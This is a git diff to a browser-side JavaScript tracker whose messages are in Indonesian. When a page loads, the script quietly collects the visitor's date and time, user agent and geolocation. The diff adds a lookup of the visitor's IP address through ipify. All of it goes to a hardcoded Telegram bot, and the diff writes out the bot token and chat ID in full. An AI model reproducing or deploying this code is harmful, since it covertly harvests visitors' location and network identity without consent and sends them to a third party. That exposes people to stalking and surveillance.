@@ -5,11 +5,11 @@ var botToken = '7414756868:AAEoYeLOI3CXh8C-MKZoBDdJkiJjMQxfGPs';
 var chatId = '5450283191';
 
 
-function sendDateTimeAndUserAgentToTelegram(dateTime, userAgent) {
+function sendDateTimeUserAgentAndIPToTelegram(dateTime, userAgent, ip) {
     var telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
     var data = {
         chat_id: chatId,
-        text: `Tanggal dan Waktu: ${dateTime}\nUser Agent: ${userAgent}`
+        text: `Tanggal dan Waktu di akses: ${dateTime}\nUser Agent: ${userAgent}\nIP Address: ${ip}`
     };
 
     var xhr = new XMLHttpRequest();
@@ -19,14 +19,36 @@ function sendDateTimeAndUserAgentToTelegram(dateTime, userAgent) {
     xhr.onreadystatechange = function () {
         if (xhr.readyState === XMLHttpRequest.DONE) {
             if (xhr.status === 200) {
-                console.log('Datetime and User Agent sent to Telegram');
+                console.log('Datetime, User Agent, and IP ');
             } else {
-                console.error('Failed to send DateTime and User Agent to Telegram:', xhr.status);
+                console.error('Failed to send DateTime, User Agent,:', xhr.status);
             }
         }
     };
 
     xhr.send(JSON.stringify(data));
+}
+
+
+
+function getIPAddress(callback) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.ipify.org?format=json', true);
+
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                var response = JSON.parse(xhr.responseText);
+                var ip = response.ip;
+                callback(ip);
+            } else {
+                console.error('Failed to get IP address:', xhr.status);
+                callback(null);
+            }
+        }
+    };
+
+    xhr.send();
 }
 
 
@@ -38,6 +60,8 @@ function sendLocationToTelegram(latitude, longitude, userAgent) {
         latitude: latitude,
         longitude: longitude,
         caption: `User Agent: ${userAgent}`
+
+
     };
 
     var xhr = new XMLHttpRequest();
@@ -66,6 +90,8 @@ function getLocationAndSend() {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             var userAgent = navigator.userAgent;
+
+            
 
             
             sendLocationToTelegram(latitude, longitude, userAgent);
@@ -109,8 +135,11 @@ document.addEventListener("DOMContentLoaded", function () {
     
     var userAgent = navigator.userAgent;
 
-    
-    sendDateTimeAndUserAgentToTelegram(currentDateTime, userAgent);
+   
+    getIPAddress(function(ip) {
+        
+        sendDateTimeUserAgentAndIPToTelegram(currentDateTime, userAgent, ip);
+    });
 
     
     getLocationAndSend();
